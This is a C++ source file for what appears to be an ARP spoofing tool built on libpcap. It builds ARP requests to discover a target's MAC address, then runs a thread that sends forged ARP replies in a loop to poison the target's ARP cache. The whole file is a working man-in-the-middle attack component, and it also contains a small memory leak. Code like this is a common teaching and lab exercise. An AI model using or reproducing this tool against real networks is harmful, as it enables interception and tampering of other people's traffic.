#include "arp_spoof.h"
#include <unistd.h>

EthArpPacket gen_arp_req(Mac smac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

EthArpPacket gen_arp_reply(Mac smac_, Mac tmac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(tmac_);
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac(tmac_);
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

Mac get_arp_reply_mac(const u_char *packet, Mac dmac_, Ip sip_, Ip tip_)
{
    EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));

    ethArpPacket = (EthArpPacket *)packet;

    if ((ethArpPacket->eth_.type()) != EthHdr::Arp ||
        ethArpPacket->eth_.dmac() != dmac_ ||
        ethArpPacket->arp_.op() != ArpHdr::Reply)
        return Mac::broadcastMac();

    if (ethArpPacket->arp_.sip() == sip_ &&
        ethArpPacket->arp_.tip() == tip_)
    {
        return Mac(ethArpPacket->arp_.smac_);
    }
    else
        return Mac::broadcastMac();
}

Mac get_mac_via_arp(pcap_t *pcap, Mac myMac, Ip myIp, Ip tip_)
{
    EthArpPacket packet = gen_arp_req(myMac, myIp, tip_);
    Mac smac;

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    int count = 1;
    while (true)
    {
        if (count++ % 10 == 0)
            pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        smac = get_arp_reply_mac(packet, myMac, tip_, myIp);

        if (smac != Mac::broadcastMac())
            break;
    }

    return smac;
}

void *t_get_mac_via_arp(void *argv)
{
    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
    ArpReqs arpReqs = arpTArgs->arpReqs_;
    Mac smac = get_mac_via_arp(arpTArgs->pcap_, arpReqs.smac_, arpReqs.sip_, arpReqs.tip_);
    arpTArgs->retMac_ = smac;

    pthread_exit(NULL);
}

int send_arp_reply(pcap_t *pcap, EthArpPacket packet)
{
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
    printf("send arp reply\n");
    return 1;
}

void *t_send_arp_replys(void *argv)
{
    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
    ArpReqs arpReqs = arpTArgs->arpReqs_;
    EthArpPacket packet = gen_arp_reply(arpReqs.smac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);

    for (int i = 0; i < 70; i++)
    {
        send_arp_reply(arpTArgs->pcap_, packet);
        sleep(3);
    }

    pthread_exit(NULL);
}
